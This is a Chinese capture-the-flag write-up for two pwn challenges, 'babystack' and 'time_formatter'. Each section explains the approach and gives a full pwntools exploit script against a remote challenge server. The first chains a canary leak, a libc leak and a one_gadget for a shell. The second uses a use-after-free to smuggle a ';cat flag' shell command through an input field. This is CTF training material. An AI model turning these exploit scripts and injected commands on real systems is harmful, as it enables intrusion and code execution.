# 序

本篇wp来自于永舟学长的压力，30题谁顶得住呀。

![afraid](..\..\..\..\pics\emojis\afraid.gif) 

## 0x1  pwn1 babystack

### 题目信息
![ad-babtstack-checksec](..\..\..\..\pics\wp\ad-babystack-checksec.png)   
![ad-babtstack-idamain](..\..\..\..\pics\wp\ad-babystack-idamain.png)  

### 思路
1.泄露canary  
2.泄露libc基址  
3.利用one_gadget  
  
### exp
~~~ python
from pwn import  * 
context.log_level = 'debug'

# r = process('./babystack')
r = remote("111.198.29.45", 41434)
e = ELF('./babystack')
libc = ELF('./libc-2.23.so')

puts_plt = e.plt['puts']
puts_got = e.got['puts']
one_gadget = 0x45216
pop_rdi  = 0x400a93
main     = 0x400908

def store(pay1):
	r.recvuntil('>>')
	r.sendline('1')
	r.sendline(pay1)

def show():
	r.recvuntil('>>')
	r.sendline('2')

def quit():
	r.sendlineafter('>> ','3')

def interactive():
	r.sendline('cat flag')
	r.interactive()

payload = 'a' * 0x88
store(payload)
show()
r.recvuntil(payload)
canary = u64(r.recv(8)) - 0xa
success("canary:" + hex(canary))

payload = 'a' * 0x88 + p64(canary) + 'a' * 8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
store(payload)
r.recv()
quit()

put_addr = u64(r.recv(6).ljust(8,'\x00'))
libc_base = put_addr - libc.symbols['puts']
one_gadget_addr = libc_base + one_gadget

payload = 'a' * 0x88 + p64(canary) + 'a' * 8 + p64(one_gadget_addr)
store(payload)
quit()
interactive()
~~~

### 小知识  
canary是以'\x00'结尾的，本意为截断字符串。  
将'\x00'覆盖，利用输出函数将canary泄露。

## 0x2  time_formatter  
### 题目信息
![ad-timef-match](..\..\..\..\pics\wp\ad-timef-match.png)   
![ad-timef-malloc](..\..\..\..\pics\wp\ad-timef-malloc.png)  
![ad-timef-vul](..\..\..\..\pics\wp\ad-timef-vul.png)  

### 思路
这个题目主要是分析程序的逻辑漏洞  
发现了UAF漏洞,没有把free过后的指针设置成NULL。  
UAF的基本思路是：  
1.可能是由程序自己）申请一块内存 ptr   
2.使用free(ptr)  
3.申请与ptr大小相似的内存（为了得到 ptr ）  
4.修改 ptr 为自己想要的值
  
### exp
~~~ python  
from pwn import *
context.update(arch='amd64', log_level='debug')

# r = process('./time_formatter')
r = remote('111.198.29.45','47767')
e = ELF('./time_formatter')

def set_format(string):
    r.sendlineafter('>', '1')
    r.sendlineafter(':', string)
    r.recvuntil('set')

def set_zone(string):
    r.sendlineafter('>', '3')
    r.sendlineafter(':', string)
    r.recvuntil('set')

def print_time():
    r.sendlineafter('>', '4')

def Exit():
    r.sendlineafter('>', '5')
    r.sendlineafter('?', 'N')

set_format('laIchIck')
Exit()
set_zone('\';cat flag\'')
print_time()
r.interactive()
~~~

### 小知识  
1.strspn(str1,str2) :  C库函数，检索字符串 str1 中第一个不在字符串 str2 中出现的字符下标。  
2.strdup()在内部调用了malloc()为变量分配内存，不需要使用返回的字符串时，需要用free()释放相应的内存空间，否则会造成内存泄漏。  
3.这里的set_zone('\';cat flag\'')是“注入”（暂时不太懂，下次来补坑）
